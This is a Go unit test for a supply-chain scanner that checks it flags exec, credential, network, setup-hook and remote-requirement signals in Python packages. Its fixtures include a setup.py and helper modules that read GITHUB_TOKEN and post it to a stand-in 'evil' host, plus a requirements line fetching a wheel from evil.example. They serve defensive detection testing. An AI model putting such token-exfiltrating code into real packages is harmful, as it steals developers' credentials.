package python

import (
	"testing"

	"github.com/kurokuma/pkg9/internal/model"
)

func TestScannerReportsPythonSignals(t *testing.T) {
	target := model.ScanTarget{
		Files: []model.ScanFile{
			{
				RelativePath:   "setup.py",
				IsText:         true,
				LanguageHint:   "python",
				NormalizedText: `from setuptools import setup; import subprocess, os, requests; setup(name="x", entry_points={"console_scripts":["x=x:main"]}); token=os.environ["GITHUB_TOKEN"]; subprocess.run("echo hi", shell=True); requests.post("https://evil", data=token)`,
			},
			{
				RelativePath:   "requirements.txt",
				IsText:         true,
				NormalizedText: "https://evil.example/pkg.whl\nflask==3.0.0",
			},
			{
				RelativePath:   "alias_flow.py",
				IsText:         true,
				LanguageHint:   "python",
				NormalizedText: "import requests, os\nsecret = os.environ['GITHUB_TOKEN']\npayload = {'token': secret}\nalias = payload\nrequests.post('https://evil', data=alias['token'])\n",
			},
			{
				RelativePath:   "source.py",
				IsText:         true,
				LanguageHint:   "python",
				NormalizedText: "from sink import send\nimport os\ntoken = os.environ['GITHUB_TOKEN']\nsend(token)\n",
			},
			{
				RelativePath:   "sink.py",
				IsText:         true,
				LanguageHint:   "python",
				NormalizedText: "import requests\ndef send(secret):\n    wrapper = {'body': secret}\n    requests.post('https://evil', data=wrapper['body'])\n",
			},
		},
	}
	out := (Scanner{}).Run(target)
	if len(out.Signals["python_exec_behavior"]) == 0 {
		t.Fatal("expected python exec signal")
	}
	if len(out.Signals["python_credential_access"]) == 0 {
		t.Fatal("expected python credential signal")
	}
	if len(out.Signals["python_network_behavior"]) == 0 {
		t.Fatal("expected python network signal")
	}
	if len(out.Signals["python_setup_behavior"]) == 0 {
		t.Fatal("expected python setup signal")
	}
	if len(out.Signals["python_requirements_remote"]) == 0 {
		t.Fatal("expected remote requirements signal")
	}
	if len(out.Signals["intent_coherence"]) == 0 {
		t.Fatal("expected intent coherence signal")
	}
	if len(out.Signals["inter_module_dataflow"]) == 0 {
		t.Fatal("expected cross-file dataflow signal")
	}
}
